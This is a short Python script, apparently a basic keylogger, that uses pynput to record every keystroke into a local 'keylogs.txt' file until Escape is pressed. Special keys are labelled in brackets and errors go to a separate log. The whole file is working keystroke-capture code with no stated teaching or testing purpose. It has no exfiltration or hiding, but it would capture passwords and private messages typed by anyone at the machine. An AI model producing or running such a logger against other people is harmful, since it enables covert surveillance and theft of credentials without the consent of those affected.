import pynput
from pynput.keyboard import Key, Listener

# Constants for special key representations
SPACE = '[SPACE] '
ENTER = '[ENTER]\n'
SHIFT = '[SHIFT] '
CTRL = '[CTRL] '
ALT = '[ALT] '
BACKSPACE = '[BACKSPACE] '
TAB = '[TAB] '
CAPS_LOCK = '[CAPS_LOCK] '
ESCAPE = Key.esc
HOME = '[HOME] '
END = '[END] '
PRT_SCN = '[PRT_SCN] '
INSERT = '[INSERT] '
DELETE = '[DELETE] '
PAGE_UP = '[PAGE_UP] '
PAGE_DOWN = '[PAGE_DOWN] '
ARROW_LEFT = '[LEFT_ARROW] '
ARROW_RIGHT = '[RIGHT_ARROW] '
ARROW_UP = '[UP_ARROW] '
ARROW_DOWN = '[DOWN_ARROW] '

# Function to handle key press events
def on_press(key):
    try:
        # Open the log file in append mode and write keystrokes
        with open('keylogs.txt', 'a') as f:
            if key == Key.space:
                f.write(SPACE)
            elif key == Key.enter:
                f.write(ENTER)
            elif key == Key.shift_l or key == Key.shift_r:
                f.write(SHIFT)
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write(CTRL)
            elif key == Key.alt_l or key == Key.alt_r:
                f.write(ALT)
            elif key == Key.backspace:
                f.write(BACKSPACE)
            elif key == Key.tab:
                f.write(TAB)
            elif key == Key.caps_lock:
                f.write(CAPS_LOCK)
            elif key == Key.home:
                f.write(HOME)
            elif key == Key.end:
                f.write(END)
            elif key == Key.insert:
                f.write(INSERT)
            elif key == Key.delete:
                f.write(DELETE)
            elif key == Key.page_up:
                f.write(PAGE_UP)
            elif key == Key.page_down:
                f.write(PAGE_DOWN)
            elif key == Key.left:
                f.write(ARROW_LEFT)
            elif key == Key.right:
                f.write(ARROW_RIGHT)
            elif key == Key.up:
                f.write(ARROW_UP)
            elif key == Key.down:
                f.write(ARROW_DOWN)
            elif key == ESCAPE:
                return False
            else:
                # Write regular characters as-is
                f.write(str(key.char))
    except AttributeError:
        pass  # Ignore keys without a char attribute
    except Exception as e:
        # Log any unexpected errors to a separate error log file
        with open('error_log.txt', 'a') as error_file:
            error_file.write(f'Error: {e}\n')
def main():
    try:
        # Start listening for key presses and keep running until the escape key is pressed
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        # Log any unexpected errors during the setup of the key listener
        with open('error_log.txt', 'a') as error_file:
            error_file.write(f'Unexpected Error: {e}\n')
if __name__ == '__main__':
    main()
